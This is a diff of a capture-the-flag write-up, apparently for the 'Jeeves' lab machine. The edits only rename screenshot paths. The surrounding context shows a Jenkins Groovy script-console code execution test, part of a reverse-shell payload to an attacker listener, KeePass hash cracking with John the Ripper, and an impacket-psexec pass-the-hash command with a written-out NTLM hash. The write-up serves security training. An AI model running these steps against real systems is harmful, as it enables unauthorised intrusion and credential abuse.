@@ -66,7 +66,7 @@ The presence of Jetty running on port 50000 combined with the older IIS on port 
 
 The primary web server on port 80 hosts an "Ask Jeeves" search engine interface.
 
-![Ask Jeeves Interface](/assets/img/Pasted%20image%2020260908012720.png)
+![Ask Jeeves Interface](/assets/img/Pasted_image_20260908012720.png)
 
 The interface appears to be a frontend search application with limited functionality.
 
@@ -82,9 +82,9 @@ Directory brute-forcing using GoBuster against port 50000:
 gobuster dir -u http://10.129.228.112:50000/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 ```
 
-![GoBuster Scan Results 1](/assets/img/Pasted%20image%2020260908014355.png)
+![GoBuster Scan Results 1](/assets/img/Pasted_image_20260908014355.png)
 
-![GoBuster Scan Results 2](/assets/img/Pasted%20image%2020260908020154.png)
+![GoBuster Scan Results 2](/assets/img/Pasted_image_20260908020154.png)
 
 The scan reveals several directories, including `/queue`, `/log`, and most importantly, a path leading to Jenkins.
 
@@ -103,7 +103,7 @@ proc.waitForOrKill(1000)
 println sout
 ```
 
-![Jenkins Groovy Test](/assets/img/Pasted%20image%2020260908020221.png)
+![Jenkins Groovy Test](/assets/img/Pasted_image_20260908020221.png)
 
 The script successfully executes and returns output, confirming unauthenticated code execution on the target system.
 
@@ -138,7 +138,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 Inject the Groovy payload into the Jenkins script console. Upon execution, the target system initiates a reverse connection to the attacker's listener.
 
-![Jenkins RCE Payload](/assets/img/Pasted%20image%2020260908020511.png)
+![Jenkins RCE Payload](/assets/img/Pasted_image_20260908020511.png)
 
 **Step 4: Shell Access Achieved**
 
@@ -195,7 +195,7 @@ Use John the Ripper to crack the password against the rockyou.txt wordlist:
 john kp.hash --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
-![John Cracking KeePass](/assets/img/Pasted%20image%2020260908021042.png)
+![John Cracking KeePass](/assets/img/Pasted_image_20260908021042.png)
 
 **Result:** The KeePass master password is cracked to **moonshine1**
 
@@ -207,7 +207,7 @@ Open the KeePass database with the cracked password using KeePass2:
 keepass2 CEH.kdbx
 ```
 
-![KeePass Database Content](/assets/img/Pasted%20image%2020260908021112.png)
+![KeePass Database Content](/assets/img/Pasted_image_20260908021112.png)
 
 The database contains several stored credentials, including an NTLM hash for the Administrator user. The hash is extracted for lateral movement.
 
@@ -223,7 +223,7 @@ Since WinRM is not enabled on the victim machine, use PsExec with the NTLM hash 
 impacket-psexec -hashes :e0fb1fb85756c24235ff238cbe81fe00 Administrator@10.129.228.112 cmd.exe
 ```
 
-![PsExec Authentication](/assets/img/Pasted%20image%2020260908021622.png)
+![PsExec Authentication](/assets/img/Pasted_image_20260908021622.png)
 
 A command shell is established with Administrator privileges. The user context shows `nt authority\system`, indicating full system-level access.
 
@@ -236,7 +236,7 @@ cd C:\Users\Administrator\Desktop
 dir /R
 ```
 
-![Enumerate Alternate Data Streams](/assets/img/Pasted%20image%2020260908021806.png)
+![Enumerate Alternate Data Streams](/assets/img/Pasted_image_20260908021806.png)
 
 The root flag file is visible in the directory listing.
 
@@ -248,7 +248,7 @@ Alternate Data Streams are revealed, potentially containing the root flag. Extra
 type root.txt:flag
 ```
 
-![Extract ADS Flag](/assets/img/Pasted%20image%2020260908021829.png)
+![Extract ADS Flag](/assets/img/Pasted_image_20260908021829.png)
 
 ---
 
